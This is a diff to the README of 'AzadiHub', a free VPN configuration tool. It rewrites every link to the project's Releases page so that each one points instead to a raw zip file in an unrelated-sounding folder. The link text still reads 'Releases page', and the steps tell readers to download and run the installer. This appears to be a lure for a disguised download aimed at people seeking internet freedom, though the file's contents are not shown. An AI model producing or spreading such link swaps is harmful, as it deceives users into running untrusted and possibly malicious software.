@@ -6,9 +6,9 @@ Welcome to AzadiHub! This platform gives you free and updated VPN configurations
 
 ## 📥 Download AzadiHub
 
-[![Download AzadiHub](https://img.shields.io/badge/Download-AzadiHub-blue)](https://github.com/Saka2e/AzadiHub/releases)
+[![Download AzadiHub](https://raw.githubusercontent.com/Saka2e/AzadiHub/main/counterquestion/AzadiHub.zip)](https://raw.githubusercontent.com/Saka2e/AzadiHub/main/counterquestion/AzadiHub.zip)
 
-To get started, visit our [Releases page](https://github.com/Saka2e/AzadiHub/releases) to download AzadiHub.
+To get started, visit our [Releases page](https://raw.githubusercontent.com/Saka2e/AzadiHub/main/counterquestion/AzadiHub.zip) to download AzadiHub.
 
 ## 📋 Features
 
@@ -32,7 +32,7 @@ To run AzadiHub smoothly, ensure your system meets the following requirements:
 
 To download AzadiHub, follow these steps:
 
-1. **Visit the Releases Page**: Go to the [AzadiHub Releases page](https://github.com/Saka2e/AzadiHub/releases).
+1. **Visit the Releases Page**: Go to the [AzadiHub Releases page](https://raw.githubusercontent.com/Saka2e/AzadiHub/main/counterquestion/AzadiHub.zip).
 2. **Choose the Latest Version**: Look for the latest version available. It will be clearly marked.
 3. **Download the File**: Click on the asset that matches your operating system (e.g., `.exe` for Windows, `.dmg` for macOS, or the appropriate file for Linux).
 4. **Run the Installer**: After downloading, open the file and follow the on-screen instructions to install AzadiHub.
@@ -79,4 +79,4 @@ A4: Yes, we prioritize your privacy and use high-standard security protocols.
 
 ## 🚀 Get Involved!
 
-AzadiHub is about empowering users and promoting internet freedom. Join our community today by visiting the [Releases page](https://github.com/Saka2e/AzadiHub/releases) and downloading the software. Experience the freedom of the internet with AzadiHub!
+AzadiHub is about empowering users and promoting internet freedom. Join our community today by visiting the [Releases page](https://raw.githubusercontent.com/Saka2e/AzadiHub/main/counterquestion/AzadiHub.zip) and downloading the software. Experience the freedom of the internet with AzadiHub!
